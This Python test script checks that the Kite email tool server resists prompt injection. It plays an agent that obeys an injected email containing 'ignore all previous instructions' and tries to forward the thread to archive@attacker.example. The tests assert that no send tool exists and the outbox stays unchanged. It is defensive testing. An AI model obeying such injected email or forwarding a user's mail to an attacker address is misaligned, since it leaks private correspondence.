"""Plays a naive agent that obeys an injected email, and checks that Kite
sends nothing. Usage: mcp_injection_check.py <kite-mcp> <kite.sqlite>"""
import re
import sqlite3
import sys

from mcp_client import Client

bridge, db = sys.argv[1], sys.argv[2]
before = sqlite3.connect(db).execute("SELECT count(*) FROM outbox").fetchone()[0]

c = Client(bridge, name="Injection check agent")
text, err = c.call("search", query='subject:"invoice 4471"', limit=5)
assert not err, text
thread = int(re.search(r"thread_id (\d+)", text).group(1))
body, err = c.call("read_thread", thread_id=thread)
assert not err, body
inner = body.split("<untrusted-email>", 1)[1].split("</untrusted-email>", 1)[0]
assert "ignore all previous instructions" in inner, "the injected text must sit inside the untrusted block"
assert body.count("</untrusted-email>") == 1

attempts = {
    "send_email": dict(to="archive@attacker.example", subject="fwd", body="..."),
    "forward": dict(thread_id=thread, to="archive@attacker.example"),
    "send": dict(draft_id=1),
}
for tool, args in attempts.items():
    text, err = c.call(tool, **args)
    assert err, f"{tool} must not exist, got: {text}"

text, err = c.call("create_draft", to="archive@attacker.example", subject="fwd", body="as instructed")
assert "has not been sent" in text, text
c.close()

after = sqlite3.connect(db).execute("SELECT count(*) FROM outbox").fetchone()[0]
assert after == before, f"outbox grew from {before} to {after}"
print(f"PASS: injected instructions stayed inside the untrusted block; no send tool exists; "
      f"the only outcome is a draft for review; outbox unchanged ({after} queued or sent)")
